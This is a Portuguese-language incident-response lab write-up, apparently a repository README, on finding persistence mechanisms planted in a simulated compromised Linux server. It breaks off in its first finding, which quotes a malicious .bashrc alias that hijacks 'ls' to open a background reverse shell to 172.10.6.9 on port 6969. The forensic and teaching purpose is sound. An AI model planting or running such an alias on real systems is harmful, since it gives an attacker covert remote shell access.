# Case Study: Investigação de Persistência em Servidor Linux

> **Nota de Documentação:** Este arquivo Markdown apresenta um resumo executivo das descobertas e dos métodos de persistência identificados durante a investigação. Para uma análise visual detalhada, incluindo o passo a passo da triagem e as capturas de tela (prints) do terminal documentando cada artefato, consulte o relatório em formato PDF (`Persistence_Investigation_Lab.pdf`) disponível neste repositório.

---

## 1. Visão Geral

Este relatório documenta a análise forense e a identificação de mecanismos de persistência em um servidor comprometido, simulando um cenário real de Resposta a Incidentes (IR). 

O objetivo da atividade foi atuar como analista de IR para mapear e isolar 5 métodos distintos de persistência plantados por um atacante no usuário `giorgio` e na conta de administração `root`.

---

## 2. Análise Técnica das Descobertas

### 2.1. Manipulação de Binários e Shell (.bashrc)
Foi identificado um alias malicioso no arquivo `.bashrc` do usuário. O atacante sequestrou o comando comum `ls` para executar um Reverse Shell em segundo plano sempre que o usuário listasse os arquivos do diretório.

* **Comando Identificado:**
```bash
ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
